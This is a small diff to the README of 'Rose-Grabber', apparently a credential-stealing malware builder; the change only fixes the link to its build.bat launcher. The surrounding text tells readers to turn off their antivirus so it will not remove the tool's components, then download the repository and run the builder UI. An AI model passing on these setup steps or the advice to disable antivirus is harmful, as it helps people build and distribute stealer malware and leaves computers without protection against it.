@@ -50,7 +50,7 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 **Before proceeding, briefly disable your antivirus to avoid accidental removal of important components. Install Python properly, ensuring it's added to PATH. Preferably, use Python 3.11 and uninstall other versions. Thanks!**
 - Download repository [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 - Extract the zip file.
-- Launch UI by executing [`build.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/builder.bat).
+- Launch UI by executing [`build.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/build.bat).
 
 ### Problems? Get help!
 **You can contact us here:**
